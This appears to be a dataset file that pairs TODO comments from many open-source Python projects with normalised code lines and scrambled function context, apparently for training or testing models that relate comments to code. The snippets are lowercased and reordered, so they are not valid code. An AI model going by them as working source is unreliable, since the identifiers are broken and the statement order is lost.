# todo(yanase): remove number from system_attrs after adding trialmodel.number. </s> base_trial.system_attrs['_number'] = 0	test_create_new_trial_id_with_base_trial assert trials[0].user_attrs == base_trial.user_attrs assert trials[0].intermediate_values == base_trial.intermediate_values assert trials[0].system_attrs == base_trial.system_attrs
# todo: refactor me, please! </s> self.__image_steps = [self.__input_path] + [	_setup ] else: self.__input_path for p in self.__phases[0:(self.__starting_step - 1)]
options['taskid'] = none # todo </s> agent = pulpagent(consumer)	install if consumer is None: raise MissingResource(id) agent.install_units(units, options)
# todo: use unshare() here </s> quiet_call(	temp_mount def temp_mount(self): mpoint = tempfile.mkdtemp(suffix='.privmnt') ['mount', '-t', self.vfstype, '-o', 'noatime,noexec,nodev', '--', self.device.devpath, mpoint])
pass # todo </s> def handle_request(self, input):	handle_request
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
print("got result: >%s<" % buffer) # todo remove. </s> if len(buffer) > 0 and buffer.strip() != empty_unicode_string:	_receiver result_buffer += result buffer = u(result_buffer) if self._do_quit: continue
# todo : documentation pending </s> if not isinstance(variables, list):	tf_variables_to_numpy def tf_variables_to_numpy(variables, sess=None): var_list = [variables] else:
# todo: should be able to use lib.godot_string_new_with_wide_string directly </s> gdname = godot_string_from_pyobj(cls.__name__)	_build_script_manifest manifest = ffi.new('godot_pluginscript_script_manifest*') manifest.data = connect_handle(cls) lib.godot_string_name_new(ffi.addressof(manifest.name), gdname) if cls.__bases__ and issubclass(cls.__bases__[0], BaseObject):
raise notimplementederror # todo </s> remove/delete the item from the backend storage	remove def remove(self, item):
# todo: this procedure would leave a clean dataset, but `run` cannot handle dirty </s> ds.add('code', to_git=true)	test_procedure_discovery len(ps)) ds = Dataset(path).create(force=True) ds.add('.') ds.save()
# todo: remove the following line when issue #71 (preserve the trajdataframe index during preprocessing operations) is solved. </s> ctdf.reset_index(inplace=true, drop=true)	cluster else: ctdf = _cluster_trajectory(stops_df, cluster_radius_km=cluster_radius_km, min_samples=min_samples).reset_index(drop=True) ctdf.parameters = tdf.parameters ctdf.set_parameter(constants.CLUSTERING_PARAMS, arguments)
return  # todo return placeholder "[loading]" artist? </s> return models.artist(uri=sp_artist.link.uri, name=sp_artist.name)	to_artist def to_artist(sp_artist): if not sp_artist.is_loaded:
# todo check the op returned a view </s> if dmap and idx in dmap:	summary_memory vmap = getattr(node.op, 'view_map', None) for idx, v in enumerate(val): node_memory_saved_by_inplace += v elif vmap and idx in vmap:
#     todo </s> def release(self, path, fh):	Filesystem def readdir(self, path, fh): return ['.', '..'] + cache.list_effective_nodes(path) return os.close(fh)
# todo check if this is getting updated </s> self.asserttrue(package.repo_description)	test_package_model_fetch else:
# todo split up into several dependent tests -- need to check how this </s> model = model.transform(setsimmode("rtlsim"))	test_fpgadataflow_fclayer y_produced = oxe.execute_onnx(model, input_dict)["outp"] assert (y_produced.reshape(y_expected.shape) == y_expected).all(), "npysim failed" model = model.transform(GiveUniqueNodeNames()) model = model.transform(CodeGen_ipgen("xc7z020clg400-1", 5))
# todo: verify that the post request was received </s> data=data, headers=headers, verify=false, stream=true)	launchHeritrixJob config.heritrixCredentials_password),
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_movd res = ctx_init["xmm0"] | ctx_init["xmm1"] x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo use csv module </s> for line in request.files["bulk"]:	contact_bulk_add bulk_form = BulkRegistrationForm() if "bulk" in request.FILES: line_list = line.split(',') name = line_list[0].strip()
# todo: move this to a task queue </s> try:	delete_user 'fields are missing.') else: email = self.get_user_email(user).encode('utf-8') email_hash = hashlib.md5(email).hexdigest()
# todo docstring </s> is_dev = not is_release(flocker_version)	get_repo_options def get_repo_options(flocker_version): if is_dev: return ['--enablerepo=clusterhq-testing']
# todo: implement auto-dtype method in general parameters </s> _s.data = _s.data.astype('float32')	splice_zero_loss_peak_flog _s.data[slicer((s_size,None))] -= np.ones(new_shape)*cbell*dext _s.data[slicer((-zlp_index,None))] = zlp.data[slicer((-zlp_index,None))] _s.mapped_parameters.title = (_s.mapped_parameters.title + ' prepared for Fourier-log deconvolution')
if self._ndim == 3: # todo: use hasz </s> lgeos.geoscoordseq_getz(self._cseq, i, byref(dz))	__getitem__ lgeos.GEOSCoordSeq_getX(self._cseq, i, byref(dx)) lgeos.GEOSCoordSeq_getY(self._cseq, i, byref(dy)) res.append((dx.value, dy.value, dz.value)) else:
# todo: try/catch </s> m = importlib.import_module(module_name)	class_for_name def class_for_name(module_name, class_name): c = getattr(m, class_name) return c
# todo(reedwm): remove manual casts once mixed precision can be enabled with a </s> x = backend.cast(x, 'float32')	resnet50 bias_regularizer=regularizers.l2(L2_WEIGHT_DECAY), name='fc1000')(x) x = layers.Activation('softmax')(x) return models.Model(img_input, x, name='resnet50')
# todo: determine proper template to use. </s> app_name + "." + recipe_format + ".recipe"] = "template tbd"	handle_ds_recipe_input if app_name + "." + recipe_format + ".recipe" not in __existing_recipes__: __buildable_recipes__[
# todo: reuse code in ..diaggn.conv2d to extract the diagonal </s> sqrt_h_outs_signs)	apply backpropagate_sqrt_h(module, grad_input, grad_output, sqrt_h_outs,
#todo: test me </s> return self.position + v.cpvrotate(self.rotation_vector)	local_to_world def local_to_world(self, v):
# todo: test this </s> style = element.style	handle_computed_outline_width def handle_computed_outline_width(element): Set outline-width to zero if outline-style is none. if get_value(style, 'outline-style') == 'none': style['outline-width'] = PropertyValue('0')
# todo: this should be abstracted into a property/method or something </s> if region.inherited and not contents and hasattr(obj, 'parent_id') and obj.parent_id:	collect_items def collect_items(obj): contents = obj._content_for_region(region) return collect_items(obj.parent) return contents
# todo workaround for https://bugzilla.mozilla.org/show_bug.cgi?id=1411264 </s> el = self.page.find_element(by.css_selector, 'body')	set_as_bottom_of_range def set_as_bottom_of_range(self): self.find_element(*self._dropdown_toggle_locator).click() self.find_element(*self._set_bottom_of_range_locator).click()
# todo: add cntk </s> raise notimplementederror()	extract_conv2d_patches padding.upper()) else:
# todo: raise exception with preferred method </s> pass	req_all_threaded result = future.result() except Exception: else: ret.extend(result["results"])
return s #todo return partial result instead of giving up </s> else:	bad_empty_lines_removed return s #TODO return partial result instead of giving up else: continue return '\n'.join(['\n'.join(block)
# todo the calls to sleep were added in an attempt to make this tests </s> for minion_id in ('minion', 'sub_minion'):	test_mine_flush def test_mine_flush(self): Test mine.flush self.assertTrue( self.run_function(
#todo pliki specjalne </s> pt = self.pathtype.get(tid)	read @_pathdec def read(self, tid, length, offset, fh): if pt is not self.PathType.file: raise FuseOSError(errno.EISDIR)
# todo check argument kinds </s> return all(is_same_type(argt, args)	is_same_arg_prefix def is_same_arg_prefix(t: Callable, s: Callable) -> bool: for argt, args in zip(t.arg_types, s.arg_types))
# todo: this assert is probably not valid in all cases. </s> assert self.inipath is not none	Config__getini_unknown_type ): if type == "pathlist": dp = self.inipath.parent input_values = shlex.split(value) if isinstance(value, str) else value
# todo: support grouping and stacking at the same time </s> if self.attributes['stack'].columns is not none:	_yield_renderers group_label=self._get_label(group['group'])) renderers.append(bg) label = str(self._get_label(group['stack'])) elif self.attributes['group'].columns is not None:
# todo: each dp learns independently. an edge dp could </s> host_learned_other_dp = none	rcv_packet learn_port = port else: for other_dpid, other_valve in valves.iteritems(): if other_dpid == dp_id:
# todo(ochang): remove this once migrated to python 3. </s> value = stream.raw.getvalue()	run_one_test_parallel stream.flush() if sys.version_info.major == 2: else: value = stream.getvalue()
# todo: move 'hardcoded' coordinate specs (name, units, etc) into tile_spec </s> pass	create_storage_unit_from_datasets except OSError:
# todo(crcrpar): annotate this correctly. </s> @functools.wraps(func)	new_func def new_func(*args: Any, **kwargs: Any) -> Any: warnings.warn(
# todo: add notification related to command-line options for </s> raise errors.error(	_treat_as_renewal "OK", "Cancel") if response[0] == "cancel" or response[1] == 3: "User did not use proper CLI and would like " "to reinvoke the client.")
# todo: revise this when finat gets dual evaluation </s> fiat_element = create_base_element(element).fiat_equivalent	firedrake_local_to_cart :arg element: a ufl element. :returns: a list of arrays of floats where each array is a node. return [np.array(list(phi.get_point_dict().keys())[0]) for phi in fiat_element.dual_basis()]
# todo(tfmot): renable once savedmodel preserves step again. </s> if save_restore_fn.__name__ == '_save_restore_tf_model':	testPruneWithPolynomialDecayPastEndStep_PreservesSparsity def testPruneWithPolynomialDecayPastEndStep_PreservesSparsity( self, save_restore_fn): return begin_step, end_step = 0, 2
# todo make sure this works </s> log("creating groups...", 'info')	buildModelFromDictionary else: log("  No motors in model.", 'INFO') if 'groups' in model and model['groups']: for group in model['groups']:
# todo github.com/clusterhq/flocker/pull/897#discussion_r19024474 </s> client_1 = mongoclient(node_1)	deploy_data_application } flocker_deploy(self, deployment_config, application_config) database_1 = client_1.example database_1.posts.insert({u"the data": u"it moves"})
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo add weight regularization (l2) </s> self.dense = tf.keras.layers.dense(d_model, use_bias=false)	MultiHeadAttention self.wk = tf.keras.layers.Dense(d_model, use_bias=False) self.wv = tf.keras.layers.Dense(d_model, use_bias=False) def _split_heads(self, x): Transpose the result such that the shape is (batch_size, num_heads, seq_len, depth)
# todo -- make sure it's always a scale </s> if isinstance(scale, scaletype):	get_freq_and_midi def get_freq_and_midi(degree, octave, root, scale): freq, midinote = scale.get_freq(degree, octave, root, get_midi=True) else:
# todo: must be implemented </s> pass	get_range_from_volumes def get_range_from_volumes(self, volumes, times=0):
# todo: verify logic for create -- we shouldn't 'annexify' non-annexified </s> annex = annexrepo(repotop, create=true) # if got there -- must be a git repo	_open filedir = dirname(file) repotop = GitRepo.get_toppath(filedir) if not annex.file_has_content(file): lgr.info("File %s has no content -- retrieving", file)
# todo change to check for error when the functionality changes. currently acts as though it doesn't exist </s> url = "/api/v2/nodes/?filter[notafield]=bogus"	test_incorrect_filtering_field def test_incorrect_filtering_field(self): res = self.app.get(url) node_json = res.json['data']
# todo: handle /dev/null (windows equivalent?) for new or deleted files </s> if any([not f.endswith('.ipynb') for f in [base, local, remote, merged]]):	show_merge If we are merging a notebook, show the merge via nbmerge. Otherwise, exit with error code. return nbmergeapp.main([base, local, remote, merged]) else:
# todo: the following reproduces the old behavior of </s> k.clear()	_transformBlock i.construct() for k in block.component_objects(Objective, descend_into=True): k._constructed = False k.construct()
# todo only do these things if status is true </s> elif endpoint.state == 'unknown':	process status = Actions( endpoint, self.s.sdnc).mirror_endpoint() if self.s.investigations < self.controller['max_concurrent_reinvestigations']: self.s.investigations += 1
# todo(frostig): might the following work? </s> return false, 'both operands split and contracting'	cases if xdim in xc: if ydim in yc: elif ydim is not None: new_ydim = yc[xc.index(xdim)]
# todo: still in progress </s> snli_loader = snlidataloader()	test_case1 def test_case1(self):
# todo find out what is best used here! </s> 'preferred_dtype': np.float32}	get_properties 'input': (DENSE, UNSIGNED_DATA), 'output': (PREDICTIONS,),
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_depth_null def test_fail_depth_null(self): ``depth`` is null.
# todo(nnorwitz): enable test. </s> self.assertequal(['const', 'volatile'], modifiers)	testSimpleModifiers self.assertEqual([], templated_types)
raise mpdnotimplemented  # todo </s> and "message:" lines.	readmessages Reads messages for this client. The response is a list of "channel:"
# todo transfer headers, and authenticated proxies: not sure how to do it in chrome yet </s> chrome_options = webdriver.chrome.options.options()	_start_chrome_browser def _start_chrome_browser(self): chrome_options.add_argument('disable-infobars') return RequestiumChrome(self.webdriver_path,
# todo document me </s> cert = certificate(content=cert_pem)	check_consumer_cert_no_user def check_consumer_cert_no_user(cert_pem): subject = cert.subject() encoded_user = subject.get('CN', None)
)  # todo </s> group_id, user_id, room_id, content,	add_room return self.transport_client.add_room_to_group(
# xxx lp: todo: verify key format </s> for signature in self.sigantures:	verify_signature Invalid key format Exception Signature not found Exception if key["keyid"] == signature["keyid"]: return toto.ssl_crypto.keys.verify_signature(key, signature,
#self.assertequal(  # todo: fix </s> self.asserttrue(response.context["user"].is_anonymous())	test_admin ) else: self.assertEqual(c.get("/usern/").content, b"AnonymousUser") self.assertTrue(c.login(username="root", password="root"))
# todo factor this out entirely </s> def construct_exec_command(structure, expected_arguments, final_arguments):	construct_exec_command for item in expected_arguments: for arg in final_arguments:
# todo(kpy): remove support for legacy urls in mid-january 2012. </s> import legacy_redirect	initialize def initialize(self, request, response): webapp.RequestHandler.initialize(self, request, response) if request.method in ['GET', 'HEAD']: if legacy_redirect.get_subdomain(request):
# todo: test this method </s> value = self.cleaned_data['extra']	clean_extra def clean_extra(self): if strip_tags(value).strip(): raise forms.ValidationError("Extra code may not contain text outside tags (advanced use only).")
# todo: axis = 1 </s> return ks.from_pandas(pdf.idxmax())	idxmax pdf = kdf.to_pandas()
# .. todo:: report an error to the user </s> return false	setCategory myCategory = str(theCategory) if myCategory not in ['hazard', 'exposure']: self.reset() if myCategory in 'hazard':
#ack = self.serial_port.read() # todo: use ack </s> self.sendcommand(133) # 10000101	SetMotorCW def SetMotorCW(self):
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
model=pke.supervised.kea())  # todo: fix doc for model param </s> extension='txt', df=none, leave_one_out=false,	test_train_supervised_model str(tmp_corpus), str(tmp_ref), str(tmp_model),
# todo - gitlab issue #27 - only write cost data of controllable and in service elements </s> el_is = net[el].loc[net[el].in_service & net[el].index.isin(	_make_objective elif el == "dcline": idx = dcline_idx costs.loc[costs.element_type == el].element)].index p = costs.loc[(costs.element_type == el) & (
# todo remove compatibility shims for anki 2.1.46 and lower. </s> return self.anki_object.note_type() if hasattr(self.anki_object, 'note_type') else self.anki_object.model()	note_type def note_type(self):
# integer case, todo: bool, date etc. </s> func = lambda a: a	_handle_df_col_calls func = series_replace_funcs['dropna_float'] else: return self._replace_func(func, rhs.args) if func_name == 'column_sum':
# todo: switch _ignore_connection_aborted for _ignore_transmission_error, or provide retry mechanism </s> if self._ignore_connection_aborted:	_check_message self._fuzz_data_logger.log_fail("Target connection reset.") except sex.BoofuzzTargetConnectionAborted as e: self._fuzz_data_logger.log_info("Target connection lost (socket error: {0} {1}): You may have a " "network issue, or an issue with firewalls or anti-virus. Try "
# todo proper error message </s> raise typeerror	AttentionSeq2Seq shape = (batch_size, ) + (None, ) + (input_dim) else: if hidden_dim is None: hidden_dim = output_dim
# todo: re-enable custom_objects </s> clone = model.from_config(config)	clone_model clone = Sequential.from_config(config) except: clone.set_weights(model.get_weights()) return clone
# todo: remove compatability hook </s> shutil.copyfile(os.path.join(self.freeze_dir,esky_control_dir,"lockfile.txt"),os.path.join(self.freeze_dir,"esky-lockfile.txt"))	_run with open(lockfile,"w") as lf: lf.write("this file is used by esky to lock the version dir\n") shutil.copyfile(os.path.join(self.freeze_dir,ESKY_CONTROL_DIR,"bootstrap-manifest.txt"),os.path.join(self.freeze_dir,"esky-bootstrap.txt")) print "zipping up the esky"
# todo(danms): remove this legacy fallback when secure rbac </s> if not conf.enforce_secure_rbac:	delete_locations def delete_locations(self): self._enforce('delete_image_location') check_is_image_mutable(self._context, self._image)
return user.affiliation  # todo: update </s> elif item == 'user_institution':	get_user_info return user.email elif item == 'user_position': return user.affiliation  # TODO: update elif item == 'user_phone':
# todo: not all messages have running status </s> if status_byte < 0x80:	_read_message def _read_message(self, status_byte): dbg('+') dbg('    --- {}'.format('running status')) if self._running_status is None:
# todo: arrange </s> result = self.remote.find_distro({"name": "testdistro0"}, self.token)	test_find_distro def test_find_distro(self): Test: find a distro object self.assertTrue(result) assert 0
# todo: this should match on the app_label as well as the model name to avoid potential duplicate names </s> return {	model_names_to_filter_dict Accept a list of content types in the format ['<app>.<model>', '<app>.<model>', ...] and return a dictionary suitable for QuerySet filtering. 'model__in': [model.split('.')[1] for model in names],
# todo: -------------------------------------------------------------------- </s> env=env, shell=shell)	_git_custom_command expect_stderr=expect_stderr, cwd=cwd,
# todo: evaluate history </s> h = agent.test(env, nb_episodes=2, visualize=false, nb_max_episode_steps=100)	test_ddpg agent.fit(env, nb_steps=400, visualize=False, verbose=0, nb_max_episode_steps=100)
# todo: per node message function </s> return msg_gathered	_default_msg_func msg_gathered += x
# todo allow user to edit a txt file in blender which contains the description or take readme? </s> except exception:	exportSdf SubElement(authorEL, 'name').text = "DUMMY" SubElement(authorEL, 'email').text = "dummy@dummy.mail" import sys import traceback
# todo: check for expected warnings. </s> return self._run_master(sample_0_9_0b5)	test_config_0_9_0b5 def test_config_0_9_0b5(self):
#todo: dont unfold all, but allow enum_all() to work </s> tree_proc(self.tree, tree_item_unfold_deep, 0)	menu_goto msg_status('Project not opened') return files = [] def callback_collect(fn, item):
# xxx todo </s> if args.has_key('done') and args['done']:	__init__ DnsRequest.__init__(self, *name, **args) asyncore.dispatcher_with_send.__init__(self, *name, **args) self.donefunc = args['done'] else:
# todo also check for motion codec parameter support </s> return 'h264_nvmpi' in codecs.get('h264', {}).get('encoders', set())	has_h264_nvmpi_support if not binary: return False
# todo: remove at some point </s> elif key.upper() in self.groups:	__getattr__ if key in self.groups: return self.groups[key] return self.groups[key.upper()] raise NoGroupError('No such group: {0}'.format(key))
oldsize = self.size # todo: remove </s> assert type(self.body) in (str, list), '%s: %s' % (self.type, type(self.body))	Atom atom.write(stream) def calsize(self): if type(self.body) == str: pass
# @todo this is out because of the issue noted in the code. we'll </s> def test_bookmark_recent(self):	BookieAPITest '/api/v1/admin/bmarks?with_content=true&api_key=' + API_KEY, status=200) self._get_good_request(content=True) res = self.testapp.get('/api/v1/bmarks?api_key=' + API_KEY,
#     todo </s> def write(self, path, data, offset, fh):	Filesystem with self.rwlock: os.lseek(fh, offset, 0)
# todo: check success summary the same way. </s> `failed_because` method.	test_summary_wrong_reason Summary classes should verify failure reason passed to the
self.button_help = wx.button(self, label="help")                # todo maybe align left? </s> self.button_apply = wx.button(self, label="apply")	__init__ self.sizer_setting_hotkey = wx.StaticBoxSizer(wx.VERTICAL, self, "Hotkey") self.button_align_test = wx.Button(self, label="Align Test")    # TODO maybe align left? self.button_close = wx.Button(self, label="Close") self.sizer_main.Add(self.sizer_top_half, 0, wx.CENTER|wx.EXPAND)
# todo: remove this when distributed materials are merged </s> warnings.warn('this feature is not yet implemented in a release ' \	set_as_distrib_comp def set_as_distrib_comp(self): 'version of openmc') self._convert_to_distrib_comps = True
time.sleep(1)  # delay, for last.fm latency. todo can this be removed later? </s> last_scrobble = lastfm_user.get_recent_tracks(limit=2)[0]	test_scrobble lastfm_user = self.network.get_user(self.username) self.network.scrobble(artist=artist, title=title, timestamp=timestamp) self.assertEqual(str(last_scrobble.track.artist).lower(), artist) self.assertEqual(str(last_scrobble.track.title).lower(), title)
# todo: test coverage of this branch </s> logger.exception(	unsubscribe_request instance.send_activation_email(action='unsubscribe') except Exception, e: 'Error %s while submitting email to %s.', e, instance.email)
# todo(nnorwitz): it would be good to warn about this. </s> self._addbacktoken(token)	_GetClass assert token.token_type == tokenize.NAME, token if token.name not in ('public', 'protected', 'private'): base, next_token = self.GetName() bases.append(base)
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo: link user's osf account with orcid </s> message = language.external_login_email_link_success.format(	external_login_email_post kind = 'warn' else: external_id_provider=external_id_provider, email=user.username
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo necessary? </s> return con_dict	specify_connections con_dict[node_id] = conn
#todo: remove the below </s> desired_defaults = set([	analyze_defaults def analyze_defaults(self): them so the output will be more organized, making it easier for the end user to read """ (grantor, schema.qualified_name, pg_priv_kind) for grantor, schema, pg_priv_kind in self.desired_defaults ])
# todo: this function should probably move to somewhere in casexml.apps.stock </s> report = dbstockreport.objects.create(form_id=self.form_id, date=self.timestamp, type=self.tag)	create_models @transaction.commit_on_success def create_models(self): for txn in self.transactions: db_txn = DbStockTransaction(
# todo: proper java error? </s> raise runtimeerror("could not find method %d in object %s by id." % (method_id, obj.value.jvm_name))	call_boolean_method_v method = obj.value.__class__.find_method_by_id(method_id) if method is None: logger.debug("JNIEnv->CallBooleanMethodV(%s, %s <%s>, 0x%x) was called" % ( obj.value.jvm_name,
#todo tuplet: add variables for if it's the start of a tuplet </s> self.istuplet = false	VexflowNote self.accidentalDisplayStatus = None self.params = params self.tupletLength = 0 self._generateVexflowCode()
# todo: test for the _correct_ revision_id value. </s> if not activity.has_key('revision_id'):	test_create_user if not activity.has_key('id'): assert False, "activity object should have an id value" assert False, "activity object should have a revision_id value" timestamp = datetime_from_string(activity['timestamp'])
# todo: dynamically add/remove adapters </s> self._ports.clear()	_updateCallback if nb_adapters_changed: log.debug("number of adapters has changed to {}".format(self._settings["adapters"])) self._addAdapters(self._settings["adapters"]) if updated:
# todo: cronjob (celery task) to delete stale tokens </s> except emailconfirmation.doesnotexist:	confirm_email email_confirmation = EmailConfirmation.objects.get( pk=pk, token=token, valid_until__gte=now()) return TemplateResponse(request, 'registration/invalid_token.html') proceed = False
# todo: detect the zygote and run 'art-on' automatically. </s> root = os.environ["android_build_top"]	generate_setup_script def generate_setup_script(gdbpath, sysroot, binary_file, is64bit, port, debugger, connect_timeout=5): symbols_dir = os.path.join(sysroot, "system", "lib64" if is64bit else "lib") vendor_dir = os.path.join(sysroot, "vendor", "lib64" if is64bit else "lib")
#todo: log all non-http errors to stderr </s> return {"error":str(exc)}	change_slot return {"error":"navi can only modify object fields and frame slots"} except Exception as exc:
# todo: refactor to not use a try/except </s> email = feedback  # pylint: disable=undefined-variable	_info "developers nonetheless.") try: dialog.add_button(_("Report..."), 3) except NameError:
# todo: require an api key on the basic auth header </s> try:	handle_add @app.route('/api/work_queue/<string:queue_name>/add', methods=['POST']) def handle_add(queue_name): task_id = add( queue_name,
# todo lib </s> name = self.data("name")	create_standalone_datablock return None, None if DEBUG: if self.collection.get(name).name != datablock.name: logger.error(f"Name mismatch after creation of bpy.data.{self.collection_name}[{name}] ")
# no other choice fixme todo </s> return self.model.predict(x)	predict self.sklearnfit()
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	migrate_disk_and_power_off def migrate_disk_and_power_off(self, instance, dest): off the instance copies over the COW disk"""
#todo - check annotation </s> % (len(old.features, len(new.features))))	compare_record raise ValueError("%i vs %i features" \
# todo: this test requires manifold access, see: t88318502 </s> self._test_model("coco-instancesegmentation/mask_rcnn_r_50_fpn_3x.yaml")	testMaskRCNN def testMaskRCNN(self):
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: flush logs to generate a log per favorite event, so we can link </s> except:	run unsent=list(targets), ).get_or_save() logging.exception('Error processing message: %s', line)
# todo: test this block </s> meta_data.path = none	update_callback meta_data.object_id = instance.pk elif meta_data.content_type != content_type or meta_data.object_id != instance.pk: meta_data.save() meta_data = None
# todo username </s> sudo = args.pushy('ssh+sudo:{hostname}'.format(hostname=hostname))	mon_destroy try: log.debug('Removing mon from %s', hostname) destroy_mon_r = sudo.compile(destroy_mon) destroy_mon_r(
#    todo: maybe we're being too generic in this isinstance? </s> reason_msg = '%s: %s' % (error.__class__.__name__,	_incrementGlobalErrorCount elif isinstance(reason_err, httplib.HTTPException): error.args) if reason_msg is not None:
# todo(brett.cannon) implement </s> raise importerror	_default_hook def _default_hook(self, path): If the path will not work for the default hook then raise ImportError.
# todo: fix with stubber / before send event </s> with mock.patch('botocore.endpoint.endpoint._send') as _send:	_test_public_apis_will_not_be_signed def _test_public_apis_will_not_be_signed(func, kwargs): _send.side_effect = EarlyExit("we don't care about response here") try:
# todo: error </s> return	handle_BYE if call_id not in self._callids: logger.warn("Given Call-ID does not belong to any session: exit") try: self._callids[call_id].handle_BYE(msg)
# todo: implement this </s> pass	_addPrintJobToQueue def _addPrintJobToQueue(self):
# todo: hanlde multiple keys (index args) </s> def _impl(index, columns, values=none, rownames=none, colnames=none,	crosstab_overload aggfunc=None, margins=False, margins_name='All', dropna=True, normalize=False, _pivot_values=None): aggfunc=None, margins=False, margins_name='All', dropna=True, normalize=False, _pivot_values=None):
# todo(b/161952382): replace with keras premade models and </s> deep = tf.keras.layers.densefeatures(deep_columns)(input_layers)	_wide_and_deep_classifier for colname in _transformed_names(_CATEGORICAL_FEATURE_KEYS) }) for numnodes in dnn_hidden_units: deep = tf.keras.layers.Dense(numnodes)(deep)
#todo load this from somewhere </s> pad_data = [-1.46374, -0.151816, -0.161173, 0.0686325, 0.0231148, -0.154613,	allocate_devices device.targets[:l, q] = self.data.targets[self.data.seq_start[s] + batch.start[1]:self.data.seq_start[s] + batch.start[1] + l] if self.pad_batches: -0.105614, 0.00550198, 0.0911985, 0.00502809, 0.0512826, -0.0181915, 0.0225053, -0.00149681, 0.0782062, 0.0412163, 0.0526166, -0.0722563,
self.router.send_multipart([address, '', payload])  # todo, send job id </s> with self.lock:	execute_and_reply log('Computed and returning result:', address, payload)
# todo: self.assertfalse(prop.is_valid(np.bool8(true))) </s> self.asserttrue(prop.is_valid(np.int8(0)))	test_Int try: import numpy as np self.assertTrue(prop.is_valid(np.int8(1))) self.assertTrue(prop.is_valid(np.int16(0)))
pass  # todo </s> def _ondeviceconnectionstatechanged(self, key):	_onDeviceConnectionStateChanged
# todo check checksum match </s> pass	check_chunk error = True else: try: self.blob_client.chunk_head(chunk)
# todo: check num strings and support nan </s> data_start = getitem_c_arr(	get_split_view_index def get_split_view_index(arr, item_ind, str_ind): start_index = getitem_c_arr(arr._index_offsets, item_ind) arr._data_offsets, start_index + str_ind) data_start += 1
pass  # todo </s> def train_check_calc_loss(self):	train_check_calc_loss
# todo: lacp timeout configurable. </s> if lacp_age > 10:	state_expire if port.dyn_lacp_up: lacp_age = now - port.dyn_lacp_updated_time self.logger.info('LACP on %s expired', port) self.lacp_down(port)
# todo: better scoring algorithm </s> s1 = set(sen1.lower().split())	scoreSentences :param sen2: (str) sentence :returns: score s2 = set(sen2.lower().split()) score = 0
self.assertfalse(greps(err, "unit zzz.service not for --user mode")) #todo </s> self.assertequal(out.strip(), "disabled")	bad_usermode_other_commands logg.info(" %s =>%s \n%s\n%s", cmd, end, err, out) self.assertEqual(end, 1) cmd = "docker exec {testname} {systemctl} status zzz.service -vv" out, err, end = output3(cmd.format(**locals()))
# todo: make these http requests asynchronous. not easy since we don't </s> if count:	get_activities_response if cached_count >= count: continue url = API_RETWEETS_URL % tweet['id_str']
# todo: determine if this puts the case properties in the expected order. </s> case_properties={	handle case_name=hidden_value_path, case_type='task', 'task_responsible': '/data/task_responsible', 'task_due': '/data/task_due',
# todo: check if we can avoid py3 specific here </s> return "" if x is none else binary_type.decode(x)	decode_if_not_None def decode_if_not_None(x):
# todo: deprecate </s> code = self.create_authorization_code(	create_authorization_response self.request.user = grant_user if hasattr(self, 'create_authorization_code'): self.request.client, grant_user, self.request) else:
# todo implement. </s> print("todo implement")	update_parameters deltas = pickle.loads(request.data) with self.mutex: return "OK"
# todo(piyush): current api-site doesn't contain this api description. </s> put_body = json.dumps(kwargs)	update_snapshot_metadata def update_snapshot_metadata(self, snapshot_id, **kwargs): url = "snapshots/%s/metadata" % str(snapshot_id) resp, body = self.put(url, put_body)
# todo(piyush): current api-site doesn't contain this api description. </s> uri = '/agents/%s/l3-routers' % agent_id	add_router_to_l3_agent def add_router_to_l3_agent(self, agent_id, **kwargs): return self.create_resource(uri, kwargs)
# todo debug </s> print ("each rule element evaluates "	_evaluateRuleElementsRecursively + "to not triggered. Set 'or' rule " + "also to not triggered.") + "to not triggered. Set 'or' rule " + "also to not triggered.")
# todo: write a unit test </s> extend(q, get_subnodes(v))	filter_search yield v
# todo: more tests </s> self.walk(node.root())	test_non_iterable_in_generator with self.assertAddsMessages(message):
# todo: test for the _correct_ revision_id value. </s> if not activity.has_key('revision_id'):	test_add_tag if not activity.has_key('id'): assert False, "activity object has no id value" assert False, "activity has no revision_id value" timestamp = datetime_from_string(activity['timestamp'])
# todo: triage </s> layers = map(exec_page_sync, context.get_page_contexts())	exec_sync def exec_sync(context): if context.options.sidecar: sidecars = [layer[3] for layer in layers]
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo: use pabot options here </s> _copy_screenshots(options)	_report_results outputs += [_merge_one_run(os.path.join(outs_dir, index), options, tests_root_name, stats, outputfile=os.path.join('pabot_results', 'output%s.xml' % index))] if 'output' not in options: options['output'] = 'output.xml'
# todo(ihrachys): replace with port.create() once we get an object </s> port = db_api.create_object(self.context, models_v2.port,	test_attach_port_get_port_policy network = db_api.create_object(self.context, models_v2.Network, {'name': 'test-network1'}) {'name': 'test-port1', 'network_id': network['id'],
